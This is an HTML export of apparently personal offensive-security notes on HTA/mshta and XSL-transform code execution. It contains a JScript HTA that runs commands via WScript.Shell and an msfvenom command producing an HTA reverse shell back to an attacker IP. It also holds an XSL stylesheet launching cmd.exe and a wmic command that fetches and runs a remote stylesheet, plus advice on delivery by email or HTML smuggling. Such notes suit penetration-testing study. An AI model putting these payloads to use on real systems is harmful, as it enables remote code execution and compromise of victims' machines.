<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>HTA / mshta</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>HTA / mshta</h1><br/><p><h2>MSHTA attack</h2><ul><li>microsoft html application</li><li>mshta bypass.hta</li><li>needs I.E for web execution</li><li></li></ul><div class="codebox"><pre><span style="color:#7f0044;font-weight:400">&lt;html&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;head&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;script</span> <span style="color:#333333;font-weight:400">language=</span><span style="color:#3ad900;font-weight:400">&quot;JScript&quot;</span><span style="color:#7f0044;font-weight:400">&gt;</span><br />var shell = new ActiveXObject(&quot;WScript.Shell&quot;);<br />var res = shell.Run(&quot;ping -n 2 192.168.45.191&quot;);<br /><span style="color:#7f0044;font-weight:400">&lt;/script&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/head&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;body&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;script</span> <span style="color:#333333;font-weight:400">language=</span><span style="color:#3ad900;font-weight:400">&quot;JScript&quot;</span><span style="color:#7f0044;font-weight:400">&gt;</span><br />self.close();<br /><span style="color:#7f0044;font-weight:400">&lt;/script&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/body&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/html&gt;</span></pre></div><ul><li>This effectively re-invigorates our Jscript tradecraft! We can deliver this in a few different ways.<ul><li>For example, we could attach it to an email, or HTML-smuggle the file through a browse</li><li>e.g shortcut <ul><li></li></ul></li></ul></li></ul><img src="images/19-1.png" alt="images/19-1.png" /></p><p><ul><li>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.43.45 LPORT=9001 -f hta-psh -o shell.hta</li></ul></p><p></p><p></p><p></p><p><em><h2>HTA and js </h2></em><ul><li>you can embed a JS code inside HTA file </p><p></li></ul><div class="codebox"><pre>&lt;script language=&quot;JScript&quot;&gt;<br />PASTE WHOLE JS FILE HERE<br />&lt;/script&gt;</pre></div><ul><li>for instance we can use it with <a href="04_-_jscript_and_c~_45.html">dotnetjscript</a></li></ul></p><p></p><p><h2>XSL Transform</h2><ul><li>• <small>• alternative of mshta</small></li><li><small>Extensible Stylesheet Language</small></li><li><small>The process of XSLT uses Extensible Stylesheet Language (.xsl) documents to transform an XML document into a different format such as XHTML</small></li><li><small>malicious.xls</small><ul><li></li></ul></li></ul><div class="codebox"><pre>&lt;?xml <span style="color:#333333;font-weight:400">version=</span><span style="color:#3ad900;font-weight:400">&#39;1.0&#39;</span>?&gt;<br />&lt;stylesheet version=&quot;1.0&quot;<br />xmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot;<br />xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;<br />xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;<br /><br />&lt;output method=&quot;text&quot;/&gt;<br />    &lt;ms:script implements-prefix=&quot;user&quot; language=&quot;JScript&quot;&gt;<br />        <span style="color:#333333;font-weight:400">&lt;![CDATA[</span><br />            var r = new ActiveXObject(&quot;WScript.Shell&quot;);<br />            r.Run(&quot;cmd.exe&quot;);<br />    <span style="color:#333333;font-weight:400">]]&gt;</span><br />    &lt;/ms:script&gt;<br />&lt;/stylesheet&gt;</pre></div><ul><li> invoke a transform to trigger the Jscript code<ul><li>wmic process get brief /format:&quot;<a href="http://192.168.119.120/test.xsl">http://192.168.119.120/test.xsl</a>&quot;</li></ul></li></ul></p></div>
</body>
</html>
